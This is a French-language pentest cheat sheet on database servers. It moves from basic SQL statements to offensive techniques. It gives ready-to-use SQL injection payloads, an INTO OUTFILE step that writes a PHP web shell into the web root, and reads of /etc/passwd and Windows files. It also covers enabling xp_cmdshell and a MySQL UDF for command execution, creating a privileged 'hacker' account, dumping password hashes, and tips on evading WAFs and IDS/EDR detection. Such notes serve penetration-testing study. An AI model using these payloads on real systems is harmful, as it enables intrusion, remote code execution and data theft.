## Connexion aux SGBD

La connexion aux serveurs de bases de données nécessite des privilèges valides. L'outil **mysql** est utilisé pour les environnements Linux/MySQL, tandis que **sqlcmd** est l'utilitaire standard pour **MSSQL**.

```bash
# Connexion MySQL
mysql -u root -p

# Connexion MSSQL
sqlcmd -S target.com -U sa -P Password123
```

> [!tip]
> Toujours vérifier les droits de l'utilisateur courant avant de tenter une exfiltration ou une modification de structure.

## Gestion des bases de données

Ces commandes permettent de naviguer dans l'arborescence des données et de modifier la structure globale du serveur.

```sql
SHOW DATABASES;    -- Lister les bases de données
USE db_name;       -- Sélectionner une base
CREATE DATABASE db_name; -- Créer une base
DROP DATABASE db_name;   -- Supprimer une base
```

## Gestion des tables

La manipulation des tables est une étape clé lors de l'énumération (**Database Enumeration**) ou de la préparation d'une phase de **Post-Exploitation**.

```sql
SHOW TABLES;                     -- Lister les tables
DESCRIBE users;                  -- Détails d’une table
CREATE TABLE users (id INT, name VARCHAR(50)); -- Créer une table
DROP TABLE users;                -- Supprimer une table
```

## CRUD (Create, Read, Update, Delete)

Opérations fondamentales pour la manipulation des données. Ces commandes sont souvent utilisées lors de tests de **SQL Injection** pour vérifier la capacité d'écriture ou de lecture sur la base.

```sql
INSERT INTO users (id, name) VALUES (1, 'Alice'); -- Ajouter une entrée
SELECT * FROM users;                              -- Lire les données
UPDATE users SET name='Bob' WHERE id=1;           -- Modifier une entrée
DELETE FROM users WHERE id=1;                     -- Supprimer une entrée
```

## Filtres et Tri

L'utilisation de clauses de filtrage est essentielle pour extraire des données spécifiques lors d'une injection ou d'un audit.

```sql
SELECT * FROM users WHERE name='Alice'; -- Filtrer par condition
SELECT * FROM users ORDER BY id DESC;   -- Trier les résultats
SELECT * FROM users LIMIT 5;            -- Limiter le nombre de résultats
```

## Fonctions SQL

Les fonctions d'agrégation permettent d'obtenir des métriques sur les données contenues dans les tables.

```sql
SELECT COUNT(*) FROM users;       -- Compter les entrées
SELECT AVG(salary) FROM employees; -- Calculer la moyenne
SELECT SUM(price) FROM orders;     -- Calculer la somme
```

## Jointures

Les jointures permettent de corréler des données provenant de différentes tables, une technique utile pour reconstruire des relations complexes lors de l'exfiltration.

```sql
-- INNER JOIN
SELECT users.name, orders.amount
FROM users
JOIN orders ON users.id = orders.user_id;

-- LEFT JOIN
SELECT users.name, orders.amount
FROM users
LEFT JOIN orders ON users.id = orders.user_id;
```

## SQL Injection (Union-based, Error-based, Blind)

Techniques d'exploitation visant à altérer les requêtes SQL pour extraire des données non autorisées.

```sql
-- Union-based (déterminer le nombre de colonnes)
' ORDER BY 1-- 
' UNION SELECT 1,2,3--

-- Error-based (MySQL)
' AND extractvalue(1, concat(0x7e, (SELECT user()), 0x7e))--

-- Blind (Boolean-based)
' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%')--
```

## Exfiltration de données via fichiers (INTO OUTFILE)

Permet d'écrire le résultat d'une requête dans un fichier sur le système de fichiers du serveur. Nécessite le privilège **FILE**.

```sql
-- MySQL
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';

-- MSSQL (via bcp)
bcp "SELECT * FROM users" queryout "C:\inetpub\wwwroot\users.txt" -c -S target -U sa -P pass
```

## Lecture de fichiers système via SQL

Technique permettant de lire des fichiers sensibles (ex: /etc/passwd) si les privilèges le permettent.

```sql
-- MySQL
SELECT LOAD_FILE('/etc/passwd');

-- MSSQL
CREATE TABLE #temp(data NVARCHAR(MAX));
BULK INSERT #temp FROM 'C:\Windows\win.ini';
SELECT * FROM #temp;
```

## Privilege Escalation via SQL (UDF, xp_cmdshell)

Techniques avancées pour obtenir une exécution de code système (RCE) à partir de la base de données.

```sql
-- MSSQL (xp_cmdshell)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- MySQL (UDF - User Defined Functions)
-- Nécessite le chargement d'une bibliothèque partagée (.so/.dll)
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so';
SELECT sys_eval('id');
```

## Commentaires SQL spécifiques par SGBD

Utilisés pour contourner les WAF ou tronquer les requêtes.

| SGBD | Commentaires |
| :--- | :--- |
| **MySQL** | `-- ` (espace requis), `#`, `/* ... */` |
| **MSSQL** | `--`, `/* ... */` |
| **Oracle** | `--`, `/* ... */` |
| **PostgreSQL** | `--`, `/* ... */` |

## Gestion des utilisateurs

La création d'utilisateurs et l'attribution de privilèges sont des étapes critiques lors d'une **Privilege Escalation**.

```sql
CREATE USER 'hacker'@'%' IDENTIFIED BY 'P@ssword123'; -- Créer un utilisateur
GRANT ALL PRIVILEGES ON db_name.* TO 'hacker'@'%';    -- Attribuer des droits
DROP USER 'hacker'@'%';                               -- Supprimer un utilisateur
```

> [!danger]
> La commande **GRANT ALL PRIVILEGES** est très bruyante et peut être détectée par des audits de sécurité.

## Sécurité et Dump

L'extraction de données via **mysqldump** permet de sauvegarder l'intégralité d'une base pour une analyse hors-ligne.

```sql
SHOW GRANTS FOR CURRENT_USER; -- Voir les droits de l'utilisateur
SELECT user, authentication_string FROM mysql.user; -- Voir les hashs de mots de passe
mysqldump -u root -p db_name > backup.sql; -- Backup complet
```

> [!warning]
> L'utilisation de **mysqldump** peut générer des logs volumineux et alerter les systèmes de détection (IDS/EDR).

---
*Note : Les commandes ci-dessus s'inscrivent dans le cadre des phases de **Database Enumeration** et de **Post-Exploitation**. Pour des scénarios avancés, se référer aux notes sur la **SQL Injection**.*